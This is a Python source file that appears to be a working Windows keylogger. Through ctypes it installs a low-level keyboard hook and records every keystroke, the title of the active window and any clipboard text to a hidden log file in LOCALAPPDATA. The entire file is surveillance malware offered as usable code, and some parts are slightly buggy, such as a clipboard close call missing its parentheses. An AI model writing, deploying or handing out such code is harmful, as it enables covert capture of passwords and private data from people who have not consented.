#!/usr/bin/python
import sys
import os
import logging
from ctypes import *
from ctypes.wintypes import MSG, LPARAM
from ctypes.wintypes import DWORD, WPARAM


logging.basicConfig(filename=(os.environ['LOCALAPPDATA'] + "\\" + 'keylogdata.txt'),level=logging.DEBUG,format='%(message)s')

#c libs
user32 = windll.user32
kernel32 = windll.kernel32

current_window      = None #holds the current window
current_clipboard   = []   #holds the current clipboard

WH_KEYBOARD_LL = 13 #Hook ID to pass to SetWindowsHookExA
WM_KEYDOWN = 0x0100 #msg code
CTRL_CODE = 162     #exit

VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL': 0x03,
                'SPACE': 0x20,
                'LCONTROL':0xA2,
                'RCONTROL':0xA3
                }


class Keylogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    #set/unset Hook
    def setHook(self,ptr):
        self.hooked = self.lUser32.SetWindowsHookExA(
        WH_KEYBOARD_LL,
        ptr,
        kernel32.GetModuleHandleW(None),
        0
        )

        if not self.hooked:
            return False
        return True

    def unsetHook(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int,c_int,c_int,POINTER(c_void_p)) #c callable function ptr
    return CMPFUNC(fn)

#function to grab the current window and its title
def get_current_window():
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText       = user32.GetWindowTextW

    hwnd    = GetForegroundWindow() #get handle to foreground window
    length  = GetWindowTextLength(hwnd) #get length of window text in title bar
    buff    = create_unicode_buffer(length +1) #create buffer to store the window title string

    GetWindowText(hwnd,buff,length+1) # Get Window title and store in buff
    return buff.value # return window title string


def get_ClipboardType():
    formats = []
    user32.OpenClipboard(0)
    lastformat = 0
    while True:
        nextFormat = user32.EnumClipboardFormats(lastformat)
        if nextFormat == 0:
            break
        else:
            formats.append(nextFormat)
            lastformat = nextFormat
    user32.CloseClipboard
    return formats



def get_clipboard():
    #CF_TEXT = 1

    #Argument and return types for GlobalLock/GlobalUnlock
    kernel32.GlobalLock.argtypes    = [c_void_p]
    kernel32.GlobalLock.restype     = c_void_p
    kernel32.GlobalUnlock.argtypes  = [c_void_p]

    #Return type for GetClipboardData
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)

    #Required clipboard functions
    IsClipboardFormatAvailable  = user32.IsClipboardFormatAvailable
    GetClipboardData            = user32.GetClipboardData
    CloseClipboard              = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(1):           #if CF_TEXT is avaiable
            data        = GetClipboardData(1)       #get handle to data in clipboard
            data_locked = kernel32.GlobalLock(data) #get ptr to memory location where the data is located
            text        = c_char_p(data_locked)     #get a char *ptr (str in py) to the location of data_locked
            value       = text.value                #dump the content in value
            kernel32.GlobalUnlock(data_locked)      #decrement lock count
            return value.decode('latin1')
        else:
            return False
            #return the clipboard content
    finally:
            CloseClipboard()


def hookProc(nCode,wParam,lParam):
        #have some context in what window usr is typing
        global current_window
        global current_clipboard

        if current_window != get_current_window():
            current_window = get_current_window()
            logging.info('[WINDOW]' + current_window)


        if wParam is not WM_KEYDOWN:
            return user32.CallNextHookEx(Keylogger.hooked,nCode,wParam,lParam)

        hookedKey = chr(lParam[0])

        if lParam[0] not in VIRTUAL_KEYS.values():
            logging.info(hookedKey)

        for key,value in VIRTUAL_KEYS.items():
            if(lParam[0] == value):
                if(value == 0x11 or value == 0xA2 or value == 0xA3):
                    print(f"Ctrl pressed, unset Hook")
                    #Keylogger.unsetHook()
                    #sys.exit(-1)
                else:
                    logging.info(key)



        if current_clipboard != get_clipboard():
            current_clipboard = get_clipboard()
            logging.info('[CLIPBOARD]' + current_clipboard + '\n')


        return user32.CallNextHookEx(Keylogger.hooked,nCode,wParam,lParam)

def start_keylog():
    msg = MSG() # msg struct
    user32.GetMessageA(byref(msg),0,0,0)

if __name__ == "__main__":
    Keylogger = Keylogger()
    ptr = getFPTR(hookProc)
    if Keylogger.setHook(ptr):
        print(f"Hook set")

    start_keylog()
